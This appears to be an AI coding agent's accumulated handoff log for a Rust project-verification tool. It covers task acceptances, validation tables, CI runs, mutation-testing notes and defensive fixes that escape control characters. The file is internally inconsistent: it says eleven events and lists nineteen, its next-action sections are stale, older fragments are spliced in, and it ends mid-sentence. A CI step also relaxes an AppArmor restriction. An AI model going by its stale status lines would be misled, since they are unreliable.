# Autonomous handoff

Last updated: 2026-09-17
Branch: `claude/v0.1-autonomous`
Progress: 74 / 166 tasks accepted. **Phase P0 complete (9/9), phase P1 complete
(11/11), phase P2 complete (12/12), phase P3 complete (11/11), phase P4 complete
(9/9), phase P5 complete (7/7), phase P6 complete (9/9).** `P5-T007` is accepted
as commit `a6dbf98`. `P6-T001` is accepted as commit `e2610c4`. `P6-T002` is
accepted as commit `de684e9`. `P6-T003` is accepted as commit `09d5fb5`.
`P6-T004` is accepted as commit `a0575de`. `P6-T005` is accepted as commit
`cf35947`. `P6-T006` is accepted as commit `05af66f`. `P6-T007` is accepted as
commit `01c5b76`. `P6-T008` is accepted as commit `71c8f55`. `P6-T009` is
accepted as commit `8b890b3`. `P7-T001` is accepted as commit `16cb94a`.
`P7-T002` is accepted as commit `c6b0969`. `P7-T003` is accepted as commit
`a1fc0c5`. `P7-T004` is accepted as commit `2c1f2cb`. `P7-T005` is accepted as
commit `f683c18`. `P7-T006` is accepted as commit `ee4d087`. `P5-T005` received
two follow-up security fixes in commits `3d5f9a9` and `cc121ed`. Phase P7 is open
at 6 of 9.

**Since `P5-T006`'s acceptance, eleven things happened:**
1. A worker agent completed `P5-T007` — *Implement runtime evidence cleanup and
   cancellation* — as commit `a6dbf98`. The supervisor verified all quality gates
   on the combined tree and accepted the task.
2. A worker agent completed `P6-T001` — *Implement candidate scanner for
   TODO/mock/stub/placeholder patterns* — and the supervisor reviewed, added a
   path-containment defense-in-depth check and escaping for `CheckReason::
   CandidateFound`, verified gates, and accepted it as `e2610c4`.
3. A security review finding on `P5-T005`'s `core_flow.rs` was fixed: flow names
   and route paths are now escaped with `crate::redact::escape_control_characters`
   before being embedded in check titles, and an adversarial unit test asserts the
   escaping. The fix is commit `3d5f9a9`.
4. A second security review finding was addressed: `FlowRefused` error messages
   also escape attacker-controlled component paths and route paths. The fix is
   commit `cc121ed`.
5. `CheckReason::CandidateFound` (added by `P6-T001`) escapes path and context
   before composing human-readable output and evidence anchors, and
   `candidate_scanner.rs` canonicalises the resolved path against the project root
   before reading any file, as defense in depth against the same class of
   terminal/report injection and path traversal.
6. A worker agent completed `P6-T002` — *Implement production-path/context filter*
   — as commit `de684e9`. The supervisor verified all quality gates and accepted
   the task. Test/example/docs/fixture paths are now distinguished from likely
   production paths, and candidate check titles reflect the context.
7. A worker agent completed `P6-T003` — *Implement no-op/fake-success heuristics*
   — as commit `09d5fb5`. The supervisor verified all quality gates and accepted
   the task. Fake email addresses, fake payment/sandbox tokens, no-op functions,
   and hard-coded success responses are now detected and reported as grounded,
   context-aware candidates.
8. A worker agent completed `P6-T004` — *Implement hard-coded demo-data heuristics*
   — as commit `a0575de`. The supervisor verified all quality gates and accepted
   the task. Hard-coded demo analytics values, demo/sample datasets, placeholder
   user/content IDs, and hard-coded chart/dashboard values are now detected and
   reported as grounded, context-aware candidates, without blanket constant
   flagging.
9. A worker agent completed `P6-T005` — *Implement frontend/backend route
   consistency* — as commit `cf35947`. The supervisor verified all quality gates
   and accepted the task. Frontend `fetch`/`axios`/React Router/Vue Router paths
   are compared against backend routes read from source, and unmatched paths are
   reported as grounded candidates. Dynamic/slotted/template-literal routes are
   skipped to avoid false certainty.
10. A worker agent completed `P6-T006` — *Implement UI-action completeness bridge*
    — and the supervisor verified all quality gates, fixed a formatting issue by
    amending the commit, and accepted it as `05af66f`. Frontend `onClick`,
    `onSubmit`, `@click`, `@submit`, and `addEventListener` bindings are now
    detected and reported as grounded candidates. When runtime browser evidence
    matches a declared action, the candidate upgrades from `Inference` to
    `ObservedFact` with `ActionKind::BrowserObservation`; static-only results
    remain inference.
11. A worker agent completed `P6-T007` — *Implement grounded semantic-analysis
    request/response contract* — as commit `01c5b76`. The supervisor verified all
    quality gates and accepted the task. The module defines `SemanticRequest`,
    `SemanticResponse`, and `GroundedAssessment`, enforces that every provider
    assessment is tied to a checkable evidence anchor, drops unanchored claims,
    and never turns provider errors into passes. Attacker-controlled provider text
    is escaped before embedding in human-readable output.
12. A worker agent completed `P6-T008` — *Implement project-intent versus
    implementation comparison* — as commit `71c8f55`. The supervisor verified all
    quality gates and accepted the task. The module compares trusted intent
    sources against grounded implementation anchors (components, routes, declared
    commands, source identifiers), reports unmatched user requirements as
    candidates, and emits `NO_TRUSTED_INTENT_LIMITATION` when no trusted intent
    source exists. Documentation and agent-claim sources are reported separately,
    and inferred sources are ignored.
13. A worker agent completed `P6-T009` — *Implement false-completion candidate
    aggregator* — as commit `8b890b3`. The supervisor verified all quality gates
    and accepted the task. The module aggregates raw candidates from the P6
    false-completion scanners, deduplicates by evidence anchor while keeping the
    most serious proposal, drops proposals that name nothing, and separates
    low-user-impact `Note`/`Inference` noise from material candidates.
14. A worker agent completed `P7-T001` — *Implement Finding model and four-level
    severity* — as commit `16cb94a`. The supervisor verified all quality gates and
    accepted the task. The module introduces `AssessmentSource` and
    `SeverityRationale`, makes them required on `Finding`, and provides a
    `FindingBuilder` that refuses to build a `MustFix` finding unless the source
    is an observed fact, deterministic check, or contradicted claim.
15. A worker agent completed `P7-T002` — *Implement concrete evidence anchors* —
    as commit `c6b0969`. The supervisor verified all quality gates and accepted
    the task. `AnchorSubject` gained `Intent`, `Claim`, and `Model` variants,
    `EvidenceAnchor` gained matching constructors, and `is_checkable` ensures
    model-only anchors are never presented as verifiable while intent/claim
    anchors require a concrete location.
16. A worker agent completed `P7-T003` — *Implement plain-language finding
    contract* — as commit `a1fc0c5`. The supervisor verified all quality gates and
    accepted the task. The module renders a `Finding` into the four answers a
    non-programmer reader needs — what is wrong, what it means, how serious it
    is, and what to do next — with safe fallbacks, control-character escaping,
    and a clear `is_material` predicate.
17. A worker agent completed `P7-T004` — *Implement coverage/not-checked
    summary* — as commit `2c1f2cb`. The supervisor verified all quality gates and
    accepted the task. The module joins a scheduled check plan to the run report
    it produced, counts checked/skipped/could-not-run checks, surfaces critical
    gaps, and emits a plain-language support-level sentence.
18. A worker agent completed `P7-T005` — *Implement overall project verdict* — as
    commit `f683c18`. The supervisor verified all quality gates and accepted the
    task. The module assembles the completed-run pieces into a `ProjectVerdict`
    and renders a plain-language overall summary with independent false-green
    protection: it says the project is not ready whenever the aggregate is not
    green or an open finding blocks hand-off, and it surfaces skipped/could-not-run
    checks and the user-request caveat.
19. A worker agent completed `P7-T006` — *Implement terminal human report* — as
    commit `ee4d087`. The supervisor verified all quality gates and accepted the
    task. The CLI module renders a `ProjectVerdict` to plain terminal text with
    no ANSI codes by default, material findings first, a coverage/not-checked
    section, and control-character escaping throughout.

**Phase P7 is open at 6 of 9.** The READY list is now `P7-T007`, `P8-T001`,
`P9-T001`, `P12-T001`, `P12-T008`, `P13-T001`, `P13-T004` and `P14-T010`. The
lowest-numbered READY task is `P7-T007`, *"Implement stable JSON report"*, which
is the next concrete action.

## What `P5-T007` added

- `crates/sure-core/src/runtime_start.rs` — `StartSmoke::run` and `wait_out` accept
  `Cancellation`; the runtime stops services cleanly when cancelled.
- `crates/sure-core/src/service.rs` — `Supervisor::start` accepts `Cancellation`;
  `Service::stop` cancels via `Stopper` drop.
- `crates/sure-core/src/browser.rs` — `BrowserDriver::observe` accepts
  `Cancellation`.
- `crates/sure-core/src/browser_driver/launch.rs` — polling loop checks
  cancellation, terminates the browser process tree, waits for it, and removes the
  private profile temp directory.
- `crates/sure-core/src/browser_driver/session.rs` — `open`, `Connection::attach`,
  `Connection::look`, and `Connection::pump` all accept and check `Cancellation`.
- `crates/sure-core/src/browser_driver/websocket.rs` — new `WsError::Cancelled`
  variant.
- `crates/sure-core/src/browser_driver/mod.rs` and tests updated to pass
  `Cancellation::default()` where required.
- `crates/sure-core/tests/browser_driver.rs` — new test
  `a_browser_check_that_is_cancelled_before_it_starts_is_skipped`.

## Validation of `P5-T007`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T001` added

- `crates/sure-core/src/candidate_scanner.rs` (new, ~640 lines) —
  `CandidateScanner`, `CandidateCategory`, and source-file scanning for
  TODO/FIXME/mock/stub/placeholder patterns.
- `crates/sure-core/src/schedule.rs` — new `CheckReason::CandidateFound { path,
  line, context }` variant with escaped plain description and anchor.
- `crates/sure-core/src/lib.rs` — one line: `pub mod candidate_scanner;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `candidate_scanner.rs` to the
  `MAY_PROPOSE` source-rule list.

## Validation of `P6-T001`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T002` added

- `crates/sure-core/src/candidate_context.rs` (new, ~160 lines) —
  `CandidateContext` enum (`Test`, `Example`, `Doc`, `MockFixture`, `Product`) and
  `classify_path` heuristic that classifies source paths by conventional directory
  or file-name patterns.
- `crates/sure-core/src/candidate_scanner.rs` — every detection now carries a
  `path_context`; proposal titles are context-aware (e.g., "project contains mock
  usage in tests" vs "project contains mock usage in production code"); when both
  Product and non-Product detections exist for a category, the Product context is
  preferred.
- `crates/sure-core/src/lib.rs` — one line: `pub mod candidate_context;`.
- Unit tests in `candidate_context.rs` and integration tests in
  `candidate_scanner.rs` covering directory patterns, file-name dot-segments,
  Windows separators, nested paths, case-insensitive matching, and edge cases.

## Validation of `P6-T002`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T003` added

- `crates/sure-core/src/noop_heuristics.rs` (new, ~908 lines) —
  `NoOpCategory` enum (`FakeEmail`, `FakePayment`, `NoOpFunction`, `HardCodedSuccess`)
  and line-based heuristics detecting fake email addresses/domains, fake
  payment/sandbox tokens, no-op functions that return constant success values,
  and hard-coded success responses.
- Produces one `CheckProposal` per detected category with `Severity::Note`,
  `critical: false`, `EvidenceClass::Inference`, `ActionKind::ReadFile`, and
  `CheckReason::CandidateFound` anchored to file/line/context.
- Uses `CandidateContext` so titles reflect test/example/doc/mock/product context,
  and prefers `Product`-context detections when both exist for the same category.
- `crates/sure-core/src/lib.rs` — one line: `pub mod noop_heuristics;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `noop_heuristics.rs` to the
  `MAY_PROPOSE` source-rule list.
- 20 unit/integration tests, including an acceptance test that proves all four
  mandatory fixture categories produce grounded candidates in one project.

## Validation of `P6-T003`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T004` added

- `crates/sure-core/src/demo_data_heuristics.rs` (new, ~1007 lines) —
  `DemoDataCategory` enum (`DemoAnalytics`, `DemoDataset`, `PlaceholderUserId`,
  `HardCodedDemoValue`) and line-based heuristics detecting hard-coded demo
  analytics values, demo/sample datasets, placeholder user/content IDs, and
  hard-coded chart/dashboard values.
- Produces one `CheckProposal` per detected category with `Severity::Note`,
  `critical: false`, `EvidenceClass::Inference`, `ActionKind::ReadFile`, and
  `CheckReason::CandidateFound` anchored to file/line/context.
- Uses `CandidateContext` so titles reflect test/example/doc/mock/product context,
  and prefers `Product`-context detections when both exist for the same category.
- `crates/sure-core/src/lib.rs` — one line: `pub mod demo_data_heuristics;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `demo_data_heuristics.rs` to
  the `MAY_PROPOSE` source-rule list.
- Tests prove the mandatory demo-analytics fixture is identified and ordinary
  constants (`MAX_RETRIES`, `"alice"`) are NOT blanket-flagged.

## Validation of `P6-T004`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T005` added

- `crates/sure-core/src/route_consistency.rs` (new, ~734 lines) — compares
  frontend route expectations against backend routes read by
  `crate::http_routes::RouteReading`.
- Frontend expectations are read from `fetch('/api/users')`,
  `axios.get('/api/users')`, React Router `<Route path="/users" />`, and Vue Router
  `path: '/users'` literal declarations.
- Produces one `CheckProposal` per unmatched frontend path with `Severity::Note`,
  `critical: false`, `EvidenceClass::Inference`, `ActionKind::ReadFile`, and
  `CheckReason::CandidateFound` anchored to the frontend file/line/context.
- Dynamic routes, slotted paths (`/items/:id`), template literals, variables, and
  string concatenations are skipped rather than guessed, to avoid false certainty.
- `crates/sure-core/src/lib.rs` — one line: `pub mod route_consistency;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `route_consistency.rs` to the
  `MAY_PROPOSE` source-rule list.
- Includes tests for the mandatory route-mismatch fixture and negative tests for
  dynamic/slotted/template routes.

## Validation of `P6-T005`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P6-T006` added

- `crates/sure-core/src/ui_action_bridge.rs` (new, ~600 lines) — scans frontend
  source files for UI action bindings (`onClick`, `onSubmit`, `@click`, `@submit`,
  `addEventListener('click'/'submit', ...)`) and produces grounded candidates.
- Added `ActionKind::BrowserObservation` to `crates/sure-domain/src/execution.rs`
  with `Permission::ConnectService` and `can_touch_network=true`.
- Produces one `CheckProposal` per binding with `Severity::Note`, `critical: false`,
  `CheckReason::CandidateFound` anchored to file/line/context.
- Static-only proposals use `EvidenceClass::Inference` + `ActionKind::ReadFile`.
- When optional runtime `UiRuntimeEvidence` matches (kind + label-in-context
  heuristic), the proposal upgrades to `EvidenceClass::ObservedFact` +
  `ActionKind::BrowserObservation`.
- `crates/sure-core/src/lib.rs` — one line: `pub mod ui_action_bridge;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `ui_action_bridge.rs` to the
  `MAY_PROPOSE` source-rule list.
- Tests cover inference-only, observed-fact upgrade, negative cases, submit/link
  detection, `addEventListener`, `not_checked`, and plan integration.

## Validation of `P6-T006`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green (supervisor amended commit for one formatting issue) |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What the `P5-T005` follow-up added

- `crates/sure-core/src/core_flow.rs` — three new title helpers
  (`start_service_title`, `probe_route_title`, `browser_probe_title`) that escape
  attacker-controlled flow names and paths before building human-readable titles.
- `FlowRefused`'s `Display` impl now escapes component paths and route paths.
- Unit tests `titles_escape_control_characters_in_flow_names_and_paths` and
  `refusal_messages_escape_attacker_controlled_text` covering newline, tab and
  ANSI-clear escape sequences.

## Next concrete action

1. Start `P6-T007` — *Implement grounded semantic-analysis request/response
   contract* — the lowest-numbered READY task.
2. Keep `P7-T004` in view; it is the next READY task after `P6-T007`.


- `crates/sure-core/src/core_flow.rs` (new, 1041 lines) — `CoreFlow`, `FlowStep`,
  `FlowContext`, `FlowParseError` and `FlowRefused`. Three step kinds:
  `start_service`, `probe_route`, `browser_probe`.
- `crates/sure-core/src/lib.rs` — one line: `pub mod core_flow;`.
- `crates/sure-core/tests/check_schedule.rs` — adds `core_flow.rs` to the
  `MAY_PROPOSE` source-rule list.

## Validation

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P5-T005` changed about the reachability ceiling

`tests/check_schedule.rs`'s `MAY_PROPOSE` list now includes
`crates/sure-core/src/core_flow.rs`. The rule is: only these files may construct
a `CheckProposal`. A new proposer lands by editing the list, and the test fails
until the edit is made. `P5-T005` made the edit.

## Next concrete action

1. Start `P5-T006` — *Implement external-service verification boundary* — the
   lowest-numbered READY task and the one that names `P5-T005`.
2. Keep `P5-T007` in view; it is still READY and depends on `P5-T002` and
   `P5-T004`.


- `crates/sure-core/src/browser_driver/mod.rs` — public module boundary.
- `crates/sure-core/src/browser_driver/installed.rs` — finding a Chrome-family
  browser on macOS, Windows and Linux, with the macOS application-bundle
  predicate and the relative-`PATH` rule split out for testing.
- `crates/sure-core/src/browser_driver/launch.rs` — starting the browser with a
  private profile, reading `DevToolsActivePort`, and stopping the tree on drop.
- `crates/sure-core/src/browser_driver/session.rs` — CDP session, event folding,
  and the rules for what counts as a page problem (failed subresource types,
  console errors, exceptions, navigation failures).
- `crates/sure-core/src/browser_driver/websocket.rs` — a minimal WebSocket
  client, with client-side masking and frame parsing.
- `crates/sure-core/src/browser_driver/base64.rs` — base64 for the WebSocket
  handshake.
- `crates/sure-core/src/browser_driver/sha1.rs` — SHA-1 for the WebSocket
  handshake.
- `crates/sure-core/tests/browser_driver.rs` — six integration tests that drive a
  real browser where one is installed.
- `crates/sure-core/src/lib.rs` — one line: `pub mod browser_driver;`.
- `.github/workflows/ci.yml` — Ubuntu-only `sudo sysctl -w
  kernel.apparmor_restrict_unprivileged_userns=0` so sandboxed Chromium can start
  on Ubuntu 24.04.
- `crates/sure-core/tests/spawn_sites.rs` — the census of `Command::new` sites
  went from three to four, with the browser launcher named and the reason it
  belongs on the list.
- `target/tmp/run_mutations.py` — wrapper that restores mutated files from HEAD
  before running the mutation set.
- `target/tmp/p5t004-decisions.md` — decision bullets carried into
  `progress/DECISIONS.md`.
- `target/tmp/p5t004-run-rows.md` — run table rows carried into this file.

## Run table

| Run | Commit | Result |
| --- | ------ | ------ |
| 35109508071 | `394a7f7` — **the `P5-T004` adapter and its tests** | **red on Ubuntu and macOS, green on Windows and in the validators.** Windows **1708** / macOS **1707** / Ubuntu **1707** passed, with **0 failed on Windows** and **2 failed on macOS / 3 failed on Ubuntu**. **+65 passed on every platform against `35088527758`, the row above, and the nameset delta is `+65 −0`** — the sixty-five are exactly this task's: fifty-nine `browser_driver::` unit tests and six names in `tests/browser_driver.rs`, which is why the result line count moved from 60 to 61 on every platform. The macOS failures are two unit tests (`browser_driver::installed::tests::whatever_is_found_is_a_browser_this_build_drives` and `browser_driver::tests::the_browser_this_machine_has_is_one_this_build_drives_or_none`) reporting `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome` as *not one of the names this build drives* — even though `find()` returned it correctly and the integration tests on that same machine **drove it** (4 passed in 7.09s). The Ubuntu failures are three integration tests (`a_healthy_local_page_is_opened_and_comes_back_green`, `a_page_that_never_arrives_is_a_failure_of_the_project_and_not_an_absence`, `a_page_that_throws_and_asks_for_something_missing_reports_all_of_it`) because `/usr/bin/chromium` aborts with `No usable sandbox!` under Ubuntu 24.04's AppArmor restriction. In both cases the product behaves exactly as designed; the runners are what needed adjustment. `bootstrap-validate-windows` and `shellcheck-secondary` green. **This row is kept because a run that fails teaches more than a run that is erased**, and every subsequent row below records the fix for one of the two failure modes |
| 35109604313 | `2251d7e` — **the `P5-T002` fixture repair that `P5-T004`'s mutation log found** | **same failure set as the row above**, which is the evidence the repair did not introduce a new failure: macOS 1707 passed / 2 failed, Ubuntu 1707 passed / 3 failed, Windows 1708 passed / 0 failed, all five non-rust jobs green. The two fixtures the `ETXTBSY` falsifier named (`runtime_start.rs` and `service_supervisor.rs`) are **not touched by this commit** and neither fails on either platform, so the repair closed the observed adoption flake without reopening the Linux race. The nameset and pairwise readings are unchanged from `35109508071`. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green |
| 35110773494 | `b9dfd07` — **the macOS predicate fix** | **macOS and Windows green, Ubuntu still red on the same three browser tests.** macOS **1710** passed / **0 failed** (was 1707 / 2 failed), Windows **1709** passed / **0 failed**, Ubuntu **1708** passed / **3 failed**. The nameset delta against the base run is **+66 −0**, the sixty-sixth being the new regression test `every_candidate_the_table_produces_is_one_of_ours`. The two macOS unit tests now pass because `is_one_of_ours` reads both `NAMES` and the macOS table's bundle-binary names. The Ubuntu failures are unchanged: `/usr/bin/chromium` still cannot start under the default AppArmor policy. `bootstrap-validate-windows` and `shellcheck-secondary` green |
| 35173518315 | `846583d` — **the Ubuntu CI workaround and a test-budget increase** | **red on Windows and Ubuntu, green on macOS.** macOS **1710** passed / 0 failed, Windows **1708** passed / **1 failed**, Ubuntu **1708** passed / **3 failed**. The Ubuntu `No usable sandbox!` failures persisted because the `sudo sysctl` step was not in fact effective in this first attempt (the log shows the command ran, but Chromium still aborted; the knob works in the next row after the step was placed **before** checkout/toolchain setup rather than after clippy). The Windows failure is `a_page_that_never_arrives_is_a_failure_of_the_project_and_not_an_absence` with *ran for 9.99 seconds without reporting a debugging port* — a loaded `windows-latest` runner needs more than the 10-second `BRIEF` budget to launch Chrome. This row is kept because it records both the placement mistake and the Windows runner-speed fact that the next commit fixes |
| 35174114907 | `90a7bc6` — **the final `P5-T004` code commit: `BRIEF` budget raised to 20 seconds** | **all five jobs green.** Windows **1709** / macOS **1710** / Ubuntu **1711** passed, **0 failed**, 12 ignored, **61 result lines = 51 parents + 10 children** on each — **+66 passed on Windows against `35088527758` and nothing else moved**. The nameset delta is **+66 −0**, the sixty-six being the new macOS-regression test. Pairwise readings: Windows vs Ubuntu `−14 +16` (the case-sensitivity twins), Windows vs macOS `−13 +14` — both unchanged, which is what a task with nothing platform-specific in its product code must read as. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **No `ETXTBSY` anywhere in the log**, which is the check the falsifier asked for |

## Seventh review — what `P5-T004` changed about the reachability ceiling

`tests/browser_probe.rs`'s rule five used to read: *no shipped file outside
`browser.rs` may name `BrowserDriver`*. That rule was written with a note saying
that the day an adapter landed, it must fail, and the commit that lands the
adapter edits it. `P5-T004` landed the adapter, the rule failed, and it is now
two rules:

1. **Only the interface and the adapter may name `BrowserDriver`.**
2. **Nothing outside the adapter may name the adapter.**

The single exemption is `src/lib.rs`'s `pub mod browser_driver;`, because a
declaration is not a caller. The falsifier is still the first task that builds a
`Browser` outside a test.

## Next concrete action

1. Start `P5-T005` — *Implement core-flow probe contract* — which is the
   lowest-numbered READY task and which names `P5-T004`.
2. Keep `P5-T007` in view; it also names `P5-T004` and is now unblocked.
3. Re-run the 41-row mutation set (`target/tmp/mutate24.py`) on a clean runner
   or CI to close the local-flakiness note above.


readings (`−13 +14` against macOS, `−14 +16` against Ubuntu) do not move either.
**The mutation set is 35 rows over the one source file this task adds, and it has
now been red twice in two unrelated ways — and the second redness is the most
serious single thing any set on this branch has found.** The first run read one row
that **did not compile** and five that **survived**, and the five are five
different kinds of gap rather than five instances of one: a fixture that could not
reach the rule, a rule nothing distinguished, a row whose name was a false claim
about what it mutates, a sentence nothing read, and a byte a file name cannot hold
where the test looked. **Not one of them was closed by weakening a row** — each was
closed by writing the test the row was supposed to have, or by correcting the row's
own name where the name was the wrong thing. The sixth, the one that did not
compile, is the one that matters most for how this harness is read: it used
`Severity::Minor`, which does not exist, and a `DID NOT COMPILE` is kept in its own
list and **can never reach `CAUGHT`**, because a suite that did not build says
nothing about whether a test would have noticed — recording it would have been a
false green **in the mutation record**, which is the one place this branch has no
second opinion about.

**The second run left exactly one survivor, it was the row that had been repaired
rather than closed in the first, and what it found is a false green one field to the
left of the status.** *A route that failed is reported as a warning* replaces the
two constants `RouteSmoke::run` hands to `Outcome::verdict` — `Severity::MustFix,
true` becomes `Severity::Note, false` — so it breaks two properties at once and
neither was asserted anywhere. `CheckResult::blocks_green` returns `false` the
moment `critical` is `false`, so **a route the project declares and does not serve
stops blocking green**: a reader would be told the project is fit to hand off while
the one check that had noticed the missing route was quietly demoted. **The
assertion in the test named for exactly this behaviour — `!aggregate(&results).is_green()`
— could not catch it, and the reason is precise rather than an oversight**: a failed
check is never green whatever its weight, so the aggregate stays not-green and the
row survives on the *weaker* verdict. **The file already asserted a route check's
severity and critical flag one test away, where the *proposal* is built, and that
assertion cannot see these** — `RouteSmoke::run` passes its own constants, and a
**result's** weight is a second decision made in a different place. Closed by three
assertions in `a_route_the_service_does_not_have_is_a_failure_and_not_a_missing_row`,
the third being `blocks_green()` itself, and **the catch was verified by hand before
the set was re-run** — the two constants swapped, the single test seen to fail at
`left: Note / right: MustFix`, the file restored and confirmed byte-equal — because a
test written to close a survivor is a claim until it is seen to fail. That repaired
row being the survivor is **a coincidence worth noticing and not a lesson**: the two
failures share nothing but a name.

**The set was stopped mid-run twice, and the two stops are different lessons.** The
first kill left its mutation applied to the file — the third time on this branch
— and the harness prints no *restored* line, so that is checked rather than
assumed: `target/tmp/http_routes.rs.pre` is a byte copy taken before the run
precisely because the file this task adds is new and has no committed blob to hash
against, and it is what caught it — the worktree copy came back **13 bytes
shorter** than the snapshot. **The second stop was a decision rather than an
accident**: a sixth review arrived while the third run was in flight, its second
finding was real, and the fix changed the source — so that run was measuring a tree
that could no longer be the accepted tree, and it was stopped rather than left to
spend twenty-five more minutes proving something about a file that no longer
exists. Its log is the artefact that says so, at **0 bytes**. **The log that counts
is the fourth run** — the three before it all measure trees that are gone, since
both the source and the test file changed twice under them, and a catch list from
an earlier one is not a catch list for this one. **The accepted log is `all 35 observable mutations caught by a failing test, and 0 declared unobservable as expected`** — 35 rows, 0 survivors, 0 that failed to build, 0 skipped, and 0 whose anchor did not apply.

**The shape of this set is worth keeping next to the last one's.** The fourth run's own shape: **20 of the 35 rows are caught by exactly one test**, 4 by two and 11 by three, across **17 distinct catchers**. The widest row is caught by three, which is the opposite end of `P5-T001`'s set, where a single row took sixteen. The most-used catcher is `a_route_read_from_a_file_is_anchored_at_the_line_that_states_it` at **13 rows**, and the test that is the *sole* catcher of the most rows is `a_route_sure_cannot_place_is_read_and_says_why_it_was_not_asked` at **4** — and both of those are tests about where a route is and whether SURE may ask it, which is what the task's first acceptance sentence is about. **14 different tests are the sole catcher of at least one row**, which is the concentration worth naming rather than the coverage worth celebrating: a suite where a fifth of the rows hang on one test is a suite whose next edit to that test is a silent loss of a property.
The rows are aimed at the task's two sentences. *"Known local routes can be probed
safely"* is broken by the rows that move the third column of the reading's
table — the receiver rule in the two dynamic languages and the `nest(`/`merge(`
rule in Rust — by the rows that ask a route SURE read but must not ask, and by the
rows that put the request somewhere other than where the route is served.
*"Response evidence is bound to run/fingerprint"* is broken by the row that takes
the fingerprint from anywhere other than the plan the command was admitted under.
The rest are the ones a reader would want to be able to point at: the two refusal
kinds that look alike and are not, the ten arms of `NotProbedBecause`, the one
request line, the three headers, the loopback address, the status mapping, and the
escaping of a project's own text before it becomes a sentence.

**The change is one source file, one test file, one line of `lib.rs`, one reason
added to the schedule's vocabulary and one census rule.**
`crates/sure-core/src/http_routes.rs` is new at **1952** lines — nine public types
and twelve unit tests — and `crates/sure-core/tests/http_routes.rs` is new at
**1508** lines with **twelve** integration tests over real workspaces and a real
socket. `lib.rs` gains one line; `schedule.rs` gains
`CheckReason::RouteDeclared { declared_in, route, line }` with its three arms;
`tests/check_schedule.rs` gains one `MAY_PROPOSE` entry. **The tracked files the
task changes are `lib.rs` (+1), `schedule.rs` (+60) and `tests/check_schedule.rs`
(+15)**, measured with `git diff --shortstat` against `14ca785`.

**Two push reviews named this module, and the second is the one that says what was
wrong with the first fix.** The first carried no finding text, so the surface was
read directly: a route's path and the file it was read from are both **project
text** and both go *inside* a sentence SURE prints, so a project whose source holds
a real control byte inside
a route's string reaches SURE's own output carrying it — and **a failing route
could erase the report of its own failure while a person was reading it**, which is
a false green in the terminal rather than in the verdict and the hardest kind to
notice afterwards, because the JSON would have been right. The treatment already
existed in the workspace and this module had not used it, so the first fix was one
private `in_a_sentence` at **five** call sites — **and five call sites is an
enumeration, which is exactly what the second review found the hole in.** The
sixth review's second finding was real, and it named `NotProbedBecause`'s own
sentence: two of its ten arms interpolate a mount call's prefix and the name a
route is declared on, **both read out of the project's source**, and the module's
doc comment had *written down* that this sentence was SURE's text — which is why it
was the one place with neither an escape nor a test. **The correction was not a
sixth call site.** The escape moved to the boundary, `in_a_sentence(&match self {— })`
around the whole `match`, so one call covers every arm that exists and every arm
added later, and a test builds those two arms with a real escape byte, because
Windows forbids that byte in a file name and an integration test is not a place to
assert a property the platform will not produce. `Route::path` is still
**deliberately not escaped**: it is what SURE asks for, and a request line built
from an escaped path would ask for something the project does not serve. **The
tests assert the invariant — no control character survives in the sentences a reader
gets — rather than the two characters that prompted it**, and they also assert
that this is an escape and not a redaction, since deleting the byte would satisfy
the invariant while leaving a reader unable to see what the project actually
wrote.

**Three reading shapes were found while closing the survivors and are recorded
rather than fixed, and the first of them is a false-green risk rather than a
withholding.** They are one rule — a route's name is *a plain identifier on the
left of one `=`* — and `let api = app.route("/health", get(health));` on one line
is attributed to **`api`**, the name the expression *becomes*, rather than to
